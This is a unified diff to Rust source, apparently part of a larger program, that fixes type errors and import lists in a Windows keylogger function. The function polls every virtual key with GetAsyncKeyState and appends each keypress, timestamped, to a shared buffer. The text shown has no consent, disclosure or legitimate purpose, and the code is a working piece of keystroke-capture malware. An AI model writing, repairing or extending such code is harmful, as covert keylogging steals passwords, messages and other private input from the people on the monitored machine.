@@ -309,15 +309,10 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
     use winapi::shared::minwindef::UINT;
     use winapi::um::winuser::GetKeyboardState;
     use winapi::um::winuser::{
-        GetAsyncKeyState, VK_ADD, VK_APPS, VK_BACK, VK_CAPITAL, VK_CONTROL, VK_DECIMAL, VK_DELETE,
-        VK_DIVIDE, VK_DOWN, VK_END, VK_ESCAPE, VK_HOME, VK_INSERT, VK_LEFT, VK_LWIN, VK_MENU,
-        VK_MULTIPLY, VK_NEXT, VK_NUMLOCK, VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5,
-        VK_OEM_6, VK_OEM_7, VK_OEM_102, VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_PLUS,
-        VK_PAUSE, VK_PRIOR, VK_RETURN, VK_RIGHT, VK_RWIN, VK_SCROLL, VK_SHIFT, VK_SNAPSHOT,
-        VK_SPACE, VK_SUBTRACT, VK_TAB, VK_UP,
+        GetAsyncKeyState, VK_APPS, VK_CAPITAL, VK_CONTROL, VK_LWIN, VK_MENU, VK_RWIN, VK_SHIFT,
     };
 
-    let keys: Vec<UINT> = (8u16..=255u16).collect();
+    let keys: Vec<UINT> = (8u16..=255u16).map(|x| x as UINT).collect();
     let mut prev_state = vec![false; 256];
 
     while running.load(Ordering::SeqCst) {
@@ -328,7 +323,7 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
 
         let mut key_state: [u8; 256] = [0; 256];
         unsafe {
-            if GetKeyboardState(key_state.as_mut_ptr() as *mut i8) != 0 {
+            if GetKeyboardState(key_state.as_mut_ptr()) != 0 {
                 caps_lock = (key_state[VK_CAPITAL as usize] & 1) != 0;
             }
         }
@@ -348,7 +343,7 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
             let was_pressed = prev_state[vk_idx];
 
             if is_pressed && !was_pressed {
-                match vk as u32 {
+                match vk as i32 {
                     VK_SHIFT => {
                         shift_pressed = true;
                         continue;
@@ -374,12 +369,12 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
                 if !ch.is_empty() {
                     let mut d = data.lock().unwrap();
                     d.push_str(&timestamp());
-                    d.push_str(ch);
+                    d.push_str(&ch);
                     d.push('\n');
                 }
             }
 
-            match vk as u32 {
+            match vk as i32 {
                 VK_SHIFT => shift_pressed = is_pressed,
                 VK_CONTROL => ctrl_pressed = is_pressed,
                 VK_MENU => alt_pressed = is_pressed,
@@ -395,14 +390,6 @@ fn keylogger_windows(data: Arc<Mutex<String>>, running: Arc<AtomicBool>) {
 
 #[cfg(target_os = "windows")]
 fn windows_vk_to_char(vk: u32, shift: bool, caps: bool) -> String {
-    use winapi::um::winuser::{
-        VK_ADD, VK_BACK, VK_CAPITAL, VK_CONTROL, VK_DECIMAL, VK_DELETE, VK_DIVIDE, VK_DOWN, VK_END,
-        VK_ESCAPE, VK_HOME, VK_INSERT, VK_LEFT, VK_MENU, VK_MULTIPLY, VK_NEXT, VK_NUMLOCK,
-        VK_OEM_1, VK_OEM_2, VK_OEM_3, VK_OEM_4, VK_OEM_5, VK_OEM_6, VK_OEM_7, VK_OEM_102,
-        VK_OEM_COMMA, VK_OEM_MINUS, VK_OEM_PERIOD, VK_OEM_PLUS, VK_PAUSE, VK_PRIOR, VK_RETURN,
-        VK_RIGHT, VK_SCROLL, VK_SHIFT, VK_SNAPSHOT, VK_SPACE, VK_SUBTRACT, VK_TAB, VK_UP,
-    };
-
     match vk {
         0x08 => astr!("[BACKSPACE]"),
         0x09 => astr!("[TAB]"),
